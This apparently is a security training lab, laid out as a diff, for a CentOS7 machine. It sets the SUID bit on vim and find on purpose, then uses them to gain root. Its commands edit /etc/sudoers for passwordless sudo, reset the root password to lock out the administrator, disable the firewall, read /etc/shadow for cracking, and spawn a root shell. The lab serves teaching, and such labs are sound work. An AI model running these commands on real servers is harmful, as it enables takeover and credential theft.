@@ -1,0 +1,77 @@
+Some servers may be configured in a way that grants administrative privileges to programs that could be exploited.
+Deliberately configure the Vim text editor that will allow security breaches, and then test to see how this configuration can be exploited.
+Use elevated privileges to reset the password of the root user, restart a service, disable the firewall, and access password hashes.
+Grant administrative privileges to the find command, and then exploit the administrative privileges by running commands as the root user, and then accessing password hashes.
+
+On CentOS7-A:
+- Create a security vulnerability by granting administrative privileges to Vim
+To find programs that execute with administrative privileges: find / -perm -u=s -type f 2>/dev/null
+
+To view the /etc/shadow file: cat /etc/shadow
+* The /etc/shadow file is the storage location for the encrypted user account passwords. Only the system administrator can view the file contents.
+An access denied message is received as we are currently signed in using an account that does not have administrative privileges.
+
+Switch to the root user: su - root
+
+To configure Vim to run with administrative privileges (Users who run the Vim text editor): chmod u+s /usr/bin/vim
+chmod u+s /bin/vim
+
+Enter exit to return to user01.
+
+To find programs that run with administrative privileges, and to include a search for Vim: find / -perm -u=s -type f 2>/dev/null | grep vim
+
+
+- Exploit the root privilege granted to Vim
+To open the /etc/sudoers file by using the Vim text editor: vim /etc/sudoers
+This file allows for the delegation of administrative privileges. The entry made now delegates access to all commands on the system, like the system administrator(root user).
+Press Shift G to move to the end of the file and press i.
+
+%user01 ALL=(ALL) NOPASSWD:ALL
+
+Press Esc and then type :wq! Enter
+
+All system administrator privileges have now been delegated to the user01. This exploits the security vulnerability created when vim was configured in the first activity, granting it the ability to run with the system administrator credentials.
+
+
+- Use elevated privileges to take control of a server
+To reset the password: sudo passwd root
+This will lock the legitimate system administrator out of the server.
+
+To restart the sshd service: sudo systemctl restart sshd
+
+To stop, and then disable the firewall: sudo systemctl stop firewalld
+sudo systemctl disable firewalld
+
+To view the encrypted passwords stored in the /etc/shadow file: sudo cat /etc/shadow
+This would allow you to copy the encrypted passwords into a password cracking program like John the Ripper.
+
+To access a command prompt that has root privileges: sudo vim file.txt
+:set shell=/bin/bash
+:shell
+Any command run at this command prompt runs with the root user's authority.
+
+Enter exit, and then in Vim, press :q! and Enter to return to the user01 account.
+Vim provides this warning to indicate you have attempted to edit a read-only file.
+
+
+- Create a security vulnerability by configuring the find command
+To get root privileges, and then when prompted: su - root
+
+To configure the find command to run using administrative privileges: chmod u+s /bin/find
+This creates a security vulnerability that allows to run the find command with the root administrator privileges. The find command can run a command after the search completes.
+In this case, that command executes using root privileges.
+
+Enter exit to switch back to the user01 account.
+
+touch file.txt
+
+Verify root privileges: find file.txt -exec whoami \;
+
+To exploit the encrypted passwords on the system: find /etc/shadow -exec cat /etc/shadow \;
+Observe the encrypted passwords in the /etc/shadow file. This technique would allow you to copy the encrypted passwords into a password cracking program.
+
+*Granted administrative privileges to the Vim text editor.
+*Exploited the administrative privileges of Vim by elevating your own privileges to that of the root user.
+*Used elevated privileges to reconfigure the server by resetting the password of the root user, restarting a service, disabling the firewall, and accessing password hashes.
+*Granted administrative privileges to the find command.
+*Exploited the administrative privileges of the find command by running commands as the root user, and then accessing password hashes.
